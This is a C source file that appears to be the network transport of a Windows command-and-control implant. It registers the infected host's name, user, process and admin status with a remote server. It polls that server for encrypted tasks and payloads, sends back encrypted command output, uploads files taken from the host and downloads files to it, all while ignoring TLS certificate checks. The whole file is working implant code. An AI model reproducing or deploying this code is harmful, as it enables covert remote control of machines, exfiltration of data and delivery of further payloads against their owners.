#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "api_resolve.h"

AgentState g_agent = {0};

// TLS ignore flags (self-signed server cert)
#define SEC_IGNORE_FLAGS \
    (SECURITY_FLAG_IGNORE_UNKNOWN_CA | \
     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | \
     SECURITY_FLAG_IGNORE_CERT_CN_INVALID  | \
     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)

// ── Wide-string helper ────────────────────────────────────────────────────────

static wchar_t* to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t*)malloc(n * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

// ── URL parser ────────────────────────────────────────────────────────────────

typedef struct { int is_https; char host[256]; INTERNET_PORT port; char base[512]; } ParsedURL;

static ParsedURL parse_url(const char *url) {
    ParsedURL r = {0};
    const char *rest;
    if (strncmp(url, "https://", 8) == 0) { r.is_https = 1; rest = url + 8; r.port = 443; }
    else if (strncmp(url, "http://", 7) == 0) { rest = url + 7; r.port = 80; }
    else { rest = url; r.port = 80; }

    const char *slash = strchr(rest, '/');
    char host_port[256] = {0};
    if (slash) {
        strncpy(host_port, rest, slash - rest);
        strncpy(r.base, slash, sizeof(r.base) - 1);
    } else {
        strncpy(host_port, rest, sizeof(host_port) - 1);
    }
    char *colon = strrchr(host_port, ':');
    if (colon) { *colon = '\0'; r.port = (INTERNET_PORT)atoi(colon + 1); }
    strncpy(r.host, host_port, sizeof(r.host) - 1);
    return r;
}

// ── Core HTTP function ────────────────────────────────────────────────────────

// Returns 1 on success. Allocates *resp_out (caller must free). Sets *resp_len, *status.
static int http_do(const char *method, const char *path,
                   const uint8_t *body, size_t body_len,
                   uint8_t **resp_out, size_t *resp_len, int *status) {
    *resp_out = NULL; *resp_len = 0; *status = 0;

    ParsedURL p = parse_url(AGENT_SERVER_URL);
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);

    wchar_t *w_ua   = to_wide(AGENT_USER_AGENT);
    wchar_t *w_host = to_wide(p.host);
    wchar_t *w_verb = to_wide(method);
    wchar_t *w_path = to_wide(full_path);
    int ok = 0;

    HINTERNET hSess = WinHttpOpen(w_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto cleanup;

    HINTERNET hConn = WinHttpConnect(hSess, w_host, p.port, 0);
    if (!hConn) goto cleanup_sess;

    DWORD flags = p.is_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hConn, w_verb, w_path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) goto cleanup_conn;

    if (p.is_https) {
        DWORD sec = SEC_IGNORE_FLAGS;
        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
    }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0))
        goto cleanup_req;

    if (!WinHttpReceiveResponse(hReq, NULL)) goto cleanup_req;

    DWORD code = 0, code_sz = sizeof(code);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_sz, WINHTTP_NO_HEADER_INDEX);
    *status = (int)code;

    // Read response body into dynamic buffer
    size_t cap = 8192, len = 0;
    uint8_t *buf = (uint8_t*)malloc(cap);
    if (!buf) goto cleanup_req;
    DWORD got;
    while (WinHttpReadData(hReq, buf + len, (DWORD)(cap - len), &got) && got > 0) {
        len += got;
        if (len + 8192 > cap) {
            cap *= 2;
            uint8_t *nb = (uint8_t*)realloc(buf, cap);
            if (!nb) { free(buf); goto cleanup_req; }
            buf = nb;
        }
    }
    *resp_out = buf;
    *resp_len = len;
    ok = 1;

cleanup_req:  WinHttpCloseHandle(hReq);
cleanup_conn: WinHttpCloseHandle(hConn);
cleanup_sess: WinHttpCloseHandle(hSess);
cleanup:
    free(w_ua); free(w_host); free(w_verb); free(w_path);
    return ok;
}

// ── JSON helpers ──────────────────────────────────────────────────────────────

// Extract a JSON string value. Returns 1 on success.
static int json_str(const char *json, const char *key, char *out, size_t out_sz) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return 0;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1) {
        if (*p == '\\' && *(p+1)) { p++; }
        out[i++] = *p++;
    }
    out[i] = '\0';
    return 1;
}

// Allocate and return a JSON string value. Caller must free().
static char* json_str_alloc(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return NULL;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    if (*p != '"') return NULL;
    p++;
    // find end of string
    const char *start = p;
    size_t len = 0;
    while (*p && *p != '"') { if (*p == '\\' && *(p+1)) p++; p++; len++; }
    char *out = (char*)malloc(len + 1);
    if (!out) return NULL;
    // copy with escape handling
    size_t i = 0;
    for (p = start; *p && *p != '"'; p++) {
        if (*p == '\\' && *(p+1)) { p++; }
        out[i++] = *p;
    }
    out[i] = '\0';
    return out;
}

// Extract a JSON integer value.
static long long json_int(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p += strlen(needle);
    while (*p == ':' || *p == ' ') p++;
    return strtoll(p, NULL, 10);
}

// Find the next JSON object `{...}` starting at or after `p`.
// Returns pointer to '{', sets *end to '}'. Returns NULL if none.
static const char* next_obj(const char *p, const char **end) {
    while (*p && *p != '{') p++;
    if (!*p) return NULL;
    int depth = 0;
    const char *start = p;
    while (*p) {
        if (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; if (*p) p++; } }
        else if (*p == '{') depth++;
        else if (*p == '}') { depth--; if (depth == 0) { *end = p; return start; } }
        if (*p) p++;
    }
    return NULL;
}

// ── Agent protocol ────────────────────────────────────────────────────────────

static int is_elevated(void) {
    HANDLE token;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;
    DWORD elev = 0, sz = sizeof(DWORD);
    BOOL ok = GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz);
    CloseHandle(token);
    return ok && elev;
}

int agent_register(void) {
    char exe_name[MAX_PATH] = "agent.exe";
    GetModuleFileNameA(NULL, exe_name, sizeof(exe_name));
    char *slash = strrchr(exe_name, '\\');
    if (slash) memmove(exe_name, slash + 1, strlen(slash));

    char hostname[128] = "UNKNOWN", username[128] = "UNKNOWN";
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
    GetUserNameA(username,     &(DWORD){sizeof(username)});

    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
        "\"pid\":%lu,\"transport\":\"%s\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s}",
        hostname, username, (unsigned long)GetCurrentProcessId(),
        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
        is_elevated() ? "true" : "false");

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("POST", "/register",
                 (const uint8_t*)body, strlen(body),
                 &resp, &resp_len, &status) || status != 200 || !resp)
    { free(resp); return 0; }

    char agent_id[64] = {0}, aes_key_b64[128] = {0};
    char *text = (char*)resp;
    json_str(text, "agent_id", agent_id, sizeof(agent_id));
    json_str(text, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp);

    if (!agent_id[0] || !aes_key_b64[0]) return 0;

    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) { free(key); return 0; }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

AgentTask* agent_beacon(int *count) {
    *count = 0;
    if (!g_agent.has_key) return NULL;

    char path[256];
    snprintf(path, sizeof(path), "/beacon/%s", g_agent.agent_id);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("GET", path, NULL, 0, &resp, &resp_len, &status) ||
        status == 204 || status != 200 || !resp)
    { free(resp); return NULL; }

    // Decrypt
    size_t plain_len = 0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, &plain_len);
    free(resp);
    if (!plain) return NULL;

    // Parse tasks array
    const char *tasks_start = strstr((char*)plain, "\"tasks\"");
    if (!tasks_start) { free(plain); return NULL; }
    tasks_start = strchr(tasks_start, '[');
    if (!tasks_start) { free(plain); return NULL; }
    tasks_start++;

    // Count tasks
    int cap = 16;
    AgentTask *tasks = (AgentTask*)calloc(cap, sizeof(AgentTask));
    if (!tasks) { free(plain); return NULL; }

    const char *p = tasks_start;
    const char *obj_end;
    while ((p = next_obj(p, &obj_end)) != NULL) {
        // Make null-terminated copy of this task object
        size_t obj_len = obj_end - p + 1;
        char *obj = (char*)malloc(obj_len + 1);
        if (!obj) break;
        memcpy(obj, p, obj_len);
        obj[obj_len] = '\0';

        if (*count >= cap) {
            cap *= 2;
            AgentTask *nt = (AgentTask*)realloc(tasks, cap * sizeof(AgentTask));
            if (!nt) { free(obj); break; }
            tasks = nt;
        }

        AgentTask *t = &tasks[*count];
        t->id = json_int(obj, "id");
        json_str(obj, "type", t->type, sizeof(t->type));
        t->args    = json_str_alloc(obj, "args");
        t->payload = NULL; t->payload_len = 0;

        char *pl_b64 = json_str_alloc(obj, "payload");
        if (pl_b64 && pl_b64[0]) {
            t->payload = b64_decode(pl_b64, &t->payload_len);
        }
        free(pl_b64);
        free(obj);

        (*count)++;
        p = obj_end + 1;
        // Stop at end of tasks array
        if (*p == ']') break;
    }

    free(plain);
    return tasks;
}

void tasks_free(AgentTask *tasks, int count) {
    if (!tasks) return;
    for (int i = 0; i < count; i++) {
        free(tasks[i].args);
        free(tasks[i].payload);
    }
    free(tasks);
}

static void send_enc(const char *path, const char *json_body) {
    if (!g_agent.has_key) return;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
        (const uint8_t*)json_body, strlen(json_body), &enc_len);
    if (!enc) return;
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    free(resp); free(enc);
}

// Escape a string for embedding in a JSON value (replaces \ and " with \\ and \")
static char* json_escape(const char *s) {
    if (!s) return strdup("");
    size_t len = strlen(s);
    char *out = (char*)malloc(len * 2 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (s[i] == '"')       { out[j++] = '\\'; out[j++] = '"'; }
        else if (s[i] == '\\') { out[j++] = '\\'; out[j++] = '\\'; }
        else if (s[i] == '\n') { out[j++] = '\\'; out[j++] = 'n'; }
        else if (s[i] == '\r') { out[j++] = '\\'; out[j++] = 'r'; }
        else if (s[i] == '\t') { out[j++] = '\\'; out[j++] = 't'; }
        else out[j++] = s[i];
    }
    out[j] = '\0';
    return out;
}

void agent_send_result_admin(long long task_id, const char *output,
                              const char *error, int is_admin) {
    char *esc_out = json_escape(output ? output : "");
    char *esc_err = json_escape(error  ? error  : "");
    size_t json_sz = strlen(esc_out) + strlen(esc_err) + 128;
    char *body = (char*)malloc(json_sz);
    if (body) {
        snprintf(body, json_sz,
            "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
            task_id, esc_out, esc_err, is_admin ? "true" : "false");
        char path[128];
        snprintf(path, sizeof(path), "/result/%s", g_agent.agent_id);
        send_enc(path, body);
        free(body);
    }
    free(esc_out); free(esc_err);
}

void agent_send_result(long long task_id, const char *output, const char *error) {
    agent_send_result_admin(task_id, output, error, 0);
}

void agent_upload_file(long long task_id, const char *filename,
                       const uint8_t *data, size_t data_len) {
    if (!g_agent.has_key) return;
    (void)task_id;
    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32, data, data_len, &enc_len);
    if (!enc) return;
    char path[256];
    snprintf(path, sizeof(path), "/upload/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    http_do("POST", path, enc, enc_len, &resp, &resp_len, &status);
    free(resp); free(enc);
}

uint8_t* agent_download_file(const char *filename, size_t *out_len) {
    *out_len = 0;
    if (!g_agent.has_key) return NULL;
    char path[256];
    snprintf(path, sizeof(path), "/dl/%s/%s", g_agent.agent_id, filename);
    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    if (!http_do("GET", path, NULL, 0, &resp, &resp_len, &status) ||
        status != 200 || !resp)
    { free(resp); return NULL; }
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, resp, resp_len, out_len);
    free(resp);
    return plain;
}
